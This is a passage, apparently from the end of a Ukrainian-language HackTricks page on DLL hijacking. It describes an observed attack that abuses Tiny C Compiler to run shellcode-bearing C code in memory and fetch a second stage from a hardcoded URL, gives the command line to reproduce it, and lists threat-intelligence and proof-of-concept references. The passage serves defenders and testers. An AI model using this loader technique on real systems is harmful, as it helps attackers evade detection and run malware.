- Та сама інфраструктура скидала Tiny C Compiler і виконувала `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, з `libtcc.dll` поруч. Написаний атакуючими C-код містив вбудований shellcode, компілювався і запускався in-memory без запису на диск у вигляді PE. Відтворити можна так:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей етап компіляції та виконання на базі TCC імпортував `Wininet.dll` під час виконання і завантажував second-stage shellcode з жорстко вбудованого URL, забезпечуючи гнучкий loader, що маскується під запуск компілятора.

## Посилання

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
